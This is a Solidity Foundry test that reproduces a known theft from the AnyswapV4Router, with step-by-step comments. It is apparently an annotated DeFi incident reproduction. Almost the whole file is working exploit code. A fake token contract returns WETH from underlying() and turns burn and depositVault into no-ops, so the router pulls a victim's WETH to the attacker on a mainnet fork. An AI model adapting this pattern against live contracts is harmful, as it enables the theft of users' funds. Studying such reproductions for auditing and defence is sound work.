// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    // @VULNERABILITY: AnyswapV4Router.anySwapOutUnderlyingWithPermit (src: sources/AnyswapV4Router_6b7a87/AnyswapV4Router.sol:261) accepts arbitrary `token` with no whitelist/registry check. It does `address _underlying = AnyswapV1ERC20(token).underlying(); ... TransferHelper.safeTransferFrom(_underlying, from, token, amount); ... depositVault + burn(token)`. This contract (the test) acts as the malicious `token`, returning real WETH and no-op'ing the bridge accounting, causing the router to move victim WETH into attacker control with no actual cross-chain burn.
    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    AnyswapV4Router any = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    AnyswapV1ERC20 any20 = AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 14_037_236); // fork mainnet block number 14037236
    }

    function testExample() public {
        //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
        //    anySwapOutUnderlyingWithPermit(
        //     address from,
        //     address token,
        //     address to,
        //     uint amount,
        //     uint deadline,
        //     uint8 v,
        //     bytes32 r,
        //     bytes32 s,
        //     uint toChainID
        //   )

        // @EXPLOIT_STEP 1: This test contract implements the AnyswapV1ERC20 interface (underlying/burn/depositVault) to impersonate a legitimate bridged anyToken. The router has no check that `token` is registered.
        // @EXPLOIT_STEP 2: Invoke the vulnerable entrypoint anySwapOutUnderlyingWithPermit with `token = address(this)` (attacker-controlled) and `from` = victim address that can be pulled via (dummy) permit on the fork state. This passes the untrusted token into the router.
        any.anySwapOutUnderlyingWithPermit(
            0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,
            address(this),
            msg.sender,
            308_636_644_758_370_382_903,
            100_000_000_000_000_000_000,
            0,
            "0x",
            "0x",
            56
        );
        // @EXPLOIT_STEP 3: Inside the router (unseen here): _underlying = token.underlying() returns WETH; permit is called (dummy here); then real WETH.safeTransferFrom(victim, token=this, hugeAmount) moves the funds into the attacker contract because the router blindly trusts the returned underlying and target.
        // @EXPLOIT_STEP 4: Router then calls token.depositVault (no-op) and _anySwapOut which does token.burn (no-op). No anyTokens are actually minted or burned; the LogAnySwapOut is just emitted as if a cross-chain transfer occurred.
        emit log_named_uint("Before exploit, WETH balance of attacker:", weth.balanceOf(msg.sender));
        // @EXPLOIT_STEP 5: The drained WETH now resides in this contract (the fake token). Forward most of it to the attacker (msg.sender).
        weth.transfer(msg.sender, 308_636_644_758_370_382_901);
        //uint sender = weth.balanceOf(msg.sender);
        emit log_named_uint("After exploit, WETH balance of attacker:", weth.balanceOf(msg.sender));
    }

    function burn(address from, uint256 amount) external returns (bool) {
        // @EXPLOIT_STEP (callback): Router's _anySwapOut calls this expecting to burn the anyToken on source chain.
        // Because we return true with no state change, the "burn" is faked and real underlying (already transferred in) is not escrowed or accounted for.
        amount;
        from;
        return true;
    }

    function depositVault(uint256 amount, address to) external returns (uint256) {
        // @EXPLOIT_STEP (callback): Router calls this after transferFrom, expecting the anyToken to mint "vault" representation of the received underlying.
        // We return 1 (success) but do nothing — the underlying stays in attacker control instead of being properly bridged.
        amount;
        to;
        return 1;
    }

    function underlying() external view returns (address) {
        // @EXPLOIT_STEP (callback): Router does staticcall to token.underlying() to discover which real asset to pull via permit+transferFrom.
        // Returning the WETH address tells router to drain WETH (instead of the actual anyToken's underlying), and target the transfer to `token` (us).
        return WETH_Address;
    }
}
